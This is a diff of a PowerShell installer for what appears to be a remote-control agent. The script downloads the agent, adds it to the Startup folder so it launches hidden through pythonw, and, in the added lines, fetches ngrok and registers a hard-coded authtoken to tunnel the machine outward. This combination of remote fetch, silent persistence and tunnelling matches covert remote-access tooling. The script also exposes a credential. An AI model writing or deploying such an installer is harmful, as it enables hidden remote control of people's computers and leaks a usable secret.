@@ -19,6 +19,13 @@ Invoke-WebRequest $agentUrl -OutFile $agentPath
 $hostname = $env:COMPUTERNAME
 (Get-Content $agentPath) -replace 'DEVICE_NAME = "PC_1"', "DEVICE_NAME = `"$hostname`"" | Set-Content $agentPath
 
+$ngrokPath = "$dir\ngrok.exe"
+if (-not (Test-Path $ngrokPath)) {
+    Invoke-WebRequest "https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-windows-amd64.zip" -OutFile "$env:TEMP\ngrok.zip"
+    Expand-Archive "$env:TEMP\ngrok.zip" -DestinationPath $dir -Force
+    & $ngrokPath config add-authtoken 3HRUF20sBOnN98Meuyzjjc4gRcT_7SnRxBPFXe5QSP6UEJzVL
+}
+
 $pyPath = (Get-Command python).Source -replace 'python.exe','pythonw.exe'
 $startup = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup"
 Set-Content "$startup\RC_Agent.bat" "@echo off`r`nstart /min `"`" `"$pyPath`" `"$agentPath`""
